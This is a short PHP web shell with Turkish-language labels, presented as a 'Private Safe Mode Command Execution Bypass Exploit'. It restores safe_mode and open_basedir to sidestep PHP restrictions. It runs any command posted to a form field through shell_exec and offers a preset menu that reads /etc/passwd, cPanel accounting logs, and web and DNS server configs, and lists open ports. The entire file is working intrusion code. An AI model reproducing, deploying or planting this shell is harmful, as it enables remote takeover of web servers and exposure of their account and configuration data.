<?
echo "<b><font color=blue>Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit</font></b><br>";
print_r('
<pre>
<form method="POST" action="">
<b><font color=blue>Komut :</font></b><input name="baba" type="text"><input value="Çalýþtýr" type="submit">
</form>
<form method="POST" action="">
<b><font color=blue>Hýzlý Menü :=) :</font><select size="1" name="liz0">
<option value="cat /etc/passwd">/etc/passwd</option>
<option value="netstat -an | grep -i listen">Tüm Açýk Portalarý Gör</option>
<option value="cat /var/cpanel/accounting.log">/var/cpanel/accounting.log</option>
<option value="cat /etc/syslog.conf">/etc/syslog.conf</option>
<option value="cat /etc/hosts">/etc/hosts</option>
<option value="cat /etc/named.conf">/etc/named.conf</option>
<option value="cat /etc/httpd/conf/httpd.conf">/etc/httpd/conf/httpd.conf</option>
</select> <input type="submit" value="Göster Bakim">
</form>
</pre>
');
ini_restore("safe_mode");
ini_restore("open_basedir");
$liz0=shell_exec($_POST[baba]); 
$liz0zim=shell_exec($_POST[liz0]); 
$uid=shell_exec('id');
$server=shell_exec('uname -a');
echo "<pre><h4>";
echo "<b><font color=red>Kimim Ben :=)</font></b>:$uid<br>";
echo "<b><font color=red>Server</font></b>:$server<br>";
echo "<b><font color=red>Komut Sonuçlarý:</font></b><br>"; 
echo $liz0;
echo $liz0zim;
echo "</h4></pre>";
?>